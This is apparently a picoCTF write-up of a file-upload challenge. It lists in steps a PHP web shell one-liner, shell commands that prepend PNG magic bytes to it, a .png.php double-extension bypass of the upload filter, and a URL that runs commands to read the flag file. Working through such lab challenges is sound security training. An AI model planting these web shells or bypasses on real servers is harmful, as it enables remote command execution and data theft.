1. Upload normal PNG --> Nothing happens; HTML shows nothing interesting. 
2. Check for robots.txt --> Contains /intstructions.txt and /uploads/
3. I can view my PNG under in the upload folder --> /uploads/name.png.
4. instruction.txt contains tips --> 
        Let's create a web app for PNG image processing.
        It needs to:
        Allow users to upload PNG images
        	look for ".png" extension in the submitted files
        	make sure the magic bytes match (not sure what this is exactly, but Wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47")
        after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.

5. Creating a PHP file --> <?php system($_GET['cmd']); ?>
6. Write initial magic bytes --> echo -n -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.png
7. Append your PHP web shell to the new file --> cat shell.php >> shell.png
8. Uploading the file works, but PHP doesn't get executed.
9. Tryout double file ending --> .png.php and php.png --> only png.php works
10. With this png/php file uploaded, I can access terminal --> looking for data --> found picoctf in uploads/shell.png.php?cmd=cd /var/www/html; cat HFQWKODGMIYTO.txt
